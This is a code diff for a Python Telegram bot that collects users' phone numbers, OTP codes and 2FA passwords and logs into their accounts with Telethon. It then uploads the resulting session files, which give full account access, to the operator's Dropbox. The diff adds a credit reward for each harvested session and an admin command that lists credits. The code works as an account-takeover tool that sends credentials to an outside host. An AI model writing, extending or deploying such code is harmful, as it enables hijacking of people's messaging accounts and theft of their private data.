@@ -1,9 +1,13 @@
 import os
+import json
 import asyncio
 import dropbox
 from telethon import TelegramClient, errors
 from telegram import Update, ReplyKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
+from telegram.ext import (
+    ApplicationBuilder, CommandHandler, MessageHandler, filters,
+    ContextTypes, ConversationHandler
+)
 
 # ---- Your Telegram API keys ----
 API_ID = 28863669  # <-- Replace with your API ID (integer)
@@ -19,8 +23,37 @@ dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)
 # ---- States for Conversation ----
 ASK_PHONE, ASK_CODE, ASK_PASSWORD = range(3)
 
-# ---- Dictionary to track users' login states ----
+# ---- Dictionary to track users' login sessions ----
 user_sessions = {}
+
+# ---- Credits System ----
+CREDITS_FILE = "credits.json"
+ADMIN_USER_ID = 1155949927  # <-- Your Telegram user ID (for /allcredits access)
+
+def load_credits():
+    if os.path.exists(CREDITS_FILE):
+        with open(CREDITS_FILE, "r") as f:
+            return json.load(f)
+    return {}
+
+def save_credits(credits):
+    with open(CREDITS_FILE, "w") as f:
+        json.dump(credits, f, indent=4)
+
+def add_credit(user_id):
+    credits = load_credits()
+    credits[str(user_id)] = credits.get(str(user_id), 0) + 1
+    save_credits(credits)
+    upload_file_to_dropbox(CREDITS_FILE, f"/{CREDITS_FILE}")
+
+# ---- Upload Any File to Dropbox ----
+def upload_file_to_dropbox(local_path, dropbox_path):
+    if not os.path.exists(local_path):
+        print(f"❌ File not found: {local_path}. Skipping upload.")
+        return
+    with open(local_path, "rb") as f:
+        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
+    print(f"✅ Uploaded {local_path} to Dropbox.")
 
 # ---- Start Command ----
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -32,15 +65,14 @@ async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = update.message.text.strip()
     user_id = update.message.from_user.id
 
-    # Create a new Telethon client for this user
-    session_name = f"sessions/{phone}"  # Saving sessions inside 'sessions' folder
+    session_name = f"sessions/{phone}"
     os.makedirs("sessions", exist_ok=True)
     client = TelegramClient(session_name, API_ID, API_HASH)
 
     await client.connect()
 
     try:
-        sent = await client.send_code_request(phone)
+        await client.send_code_request(phone)
         user_sessions[user_id] = {"client": client, "phone": phone}
         await update.message.reply_text("📨 OTP code sent! Please send the code you received.")
         return ASK_CODE
@@ -65,10 +97,10 @@ async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await client.sign_in(phone, code)
         await update.message.reply_text("✅ Logged in successfully!")
-        
-        # Upload session file to Dropbox
-        await upload_session_to_dropbox(client, phone)
-        
+
+        # Upload session file and update credits
+        await upload_session_to_dropbox(client, phone, user_id)
+
         await client.disconnect()
         return ConversationHandler.END
 
@@ -77,7 +109,6 @@ async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ASK_PASSWORD
 
     except errors.PhoneCodeInvalidError:
-        # If wrong code, offer retry or skip
         reply_markup = ReplyKeyboardMarkup([["Retry", "Skip"]], one_time_keyboard=True, resize_keyboard=True)
         await update.message.reply_text("❗ Invalid OTP. Retry or Skip?", reply_markup=reply_markup)
         return ASK_CODE
@@ -113,21 +144,19 @@ async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await client.sign_in(password=password)
         await update.message.reply_text("✅ Logged in successfully with 2FA!")
 
-        # Upload session file to Dropbox
-        await upload_session_to_dropbox(client, session["phone"])
-        
+        # Upload session file and update credits
+        await upload_session_to_dropbox(client, session["phone"], user_id)
+
         await client.disconnect()
         return ConversationHandler.END
     except errors.PasswordHashInvalidError:
         await update.message.reply_text("❌ Incorrect password. Please send again.")
         return ASK_PASSWORD
 
-# ---- Upload Session File to Dropbox ----
-# ---- Upload Session File to Dropbox ----
-async def upload_session_to_dropbox(client, phone):
-    """Uploads session file to Dropbox"""
-    session_file_path = f"sessions/{phone}.session"  # <-- ADD ".session"
-    dropbox_path = f"/sessions/{phone}.session"      # <-- ADD ".session"
+# ---- Upload Session File to Dropbox and Update Credit ----
+async def upload_session_to_dropbox(client, phone, user_id):
+    session_file_path = f"sessions/{phone}.session"
+    dropbox_path = f"/sessions/{phone}.session"
 
     if not os.path.exists(session_file_path):
         print(f"❌ Session file not found for {phone}. Skipping upload.")
@@ -135,9 +164,36 @@ async def upload_session_to_dropbox(client, phone):
 
     with open(session_file_path, "rb") as f:
         dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
-        
+
     print(f"✅ Session file for {phone} uploaded to Dropbox.")
 
+    # Add +1 credit to user
+    add_credit(user_id)
+
+# ---- User Command: /credits ----
+async def show_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+    credits = load_credits()
+    count = credits.get(str(user_id), 0)
+    await update.message.reply_text(f"💳 You have {count} credit(s).")
+
+# ---- Admin Command: /allcredits ----
+async def show_all_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+    if user_id != ADMIN_USER_ID:
+        await update.message.reply_text("⛔ You are not authorized to view all credits.")
+        return
+
+    credits = load_credits()
+    if not credits:
+        await update.message.reply_text("📄 No credits data found.")
+        return
+
+    text = "📊 All Users Credits:\n\n"
+    for uid, count in credits.items():
+        text += f"👤 User {uid}: {count} credit(s)\n"
+
+    await update.message.reply_text(text)
 
 # ---- Cancel Command ----
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -162,8 +218,10 @@ def main():
     )
 
     app.add_handler(conv_handler)
+    app.add_handler(CommandHandler('credits', show_credits))
+    app.add_handler(CommandHandler('allcredits', show_all_credits))
 
-    print("Bot running...")
+    print("🚀 Bot running...")
     app.run_polling()
 
 if __name__ == '__main__':
